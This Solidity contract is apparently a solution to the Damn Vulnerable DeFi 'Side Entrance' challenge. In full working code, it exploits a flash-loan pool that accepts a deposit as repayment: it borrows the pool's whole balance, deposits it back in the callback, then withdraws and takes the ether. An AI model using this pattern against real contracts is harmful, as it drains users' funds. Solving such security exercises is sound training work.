// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "hardhat/console.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver  {

    address pool;
    constructor(address _pool) {
        pool = _pool;
    }
    function attack() external {
        uint256 poolBalance = pool.balance;
        SideEntranceLenderPool(pool).flashLoan(poolBalance);
        SideEntranceLenderPool(pool).withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, poolBalance);
    }

    function execute() external payable override {
        console.log(msg.value);
        SideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    receive() external payable {}

}